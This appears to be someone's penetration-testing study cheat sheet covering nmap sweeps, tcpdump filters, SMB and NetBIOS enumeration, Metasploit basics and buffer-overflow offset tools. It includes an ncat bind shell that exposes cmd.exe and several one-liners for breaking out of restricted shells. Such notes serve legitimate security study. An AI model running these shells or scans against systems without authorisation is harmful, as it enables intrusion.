netstat -antp|grep sshd  ## find sshd to confirm that it's running

sudo service ssh start|stop ## start/stop ssh service

systemctl enable [service_name] ## enable service at boot

##Find command with all matching patern
find / -name sbd*

## Find all commands with pattern and describe them
find / -name sbd* -exec file {} \;

##Grepping with cut, get all href in an index.html and look for all http:// cut them to get domain name
cat index.html | grep "href=" | cut -d"/" -f3| grep "cisco\.com" | cut -d'"' -f1 | sort -u ## remove dups

## to write a bash script to look up host IP address in a file of domains

for url in $(cat cisco.txt) do
host $url | grep "has address" | cut -d" " -f4
done

## ncat (new version of nc) can be done below for a bind shell
ncat -lvp 4444 -e cmd.exe --ssl --allow host_ip 

--allow switch to protect the connection from unwanted connection, this is one of the advs from nc.


PING SWEEP scan:

nmap -sn 1.2.3.1-254 -oG output-to-file.txt

Sweeping for common port:

nmap -p 80 1.2.3.1-254 -oG output-to-file.txt

NMAP Nmap Scripting Engine:

Allow script to automate tasks

NMAP Directories to note:

/usr/share/nmap/scripts

TCPDUMP: 

Commands to filter like wireshark below.

tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap  << filter by host IP
tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap << filter by dst IP
tcpdump -n port 81 -r password_cracking_filtered.pcap  << filter only port 81

NBTSCAN:

A tool to scan for netbios information

Metasploit:

First connect to postgresql service before launching msfconsole

hosts ## will contains all hosts scanned
db_nmap [ip_cdr] --top-ports 20 ## scan a range of ip with top 20 ports and store in db
services -p 443 ## will search database of all scanned hosts for specific ports

Staged and Non-Staged payloads:

Non-Staged payloads are ones that were sent by msf in its entirety. For instance, reverse_tcp payload on a SLMail 5.5 exploit.

Staged are split into 2 parts:
• First part is the "instructions" to the victim machine to tell it on where to connect back, which is the attacker's machine in most cases.
• Meterpreter is a staged payloads because it provides additional capabilities.

nbtscan 10.11.1.1-254

ENUM4LINUX tool:

Can be use to enumerate Windows server NULL SMB sessions.

enum4linux -a 10.11.1.227

SNMP  (UDP) scan:

Using nmap to find all ips running SNMP on port 161 as follow:

nmap -sU -p 161 ip-range

BUFFER OVERFLOW:

PATTERN_CREATE: A useful utility to generate random string patterns in MSF.

pattern_create -l [lengh]

PATTERN_OFFSET: A tool to calculate offset based on EIP value

pattern_offset -q 12345678

POST EXPLOITATION:

Break out the "jail" shell:

python -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
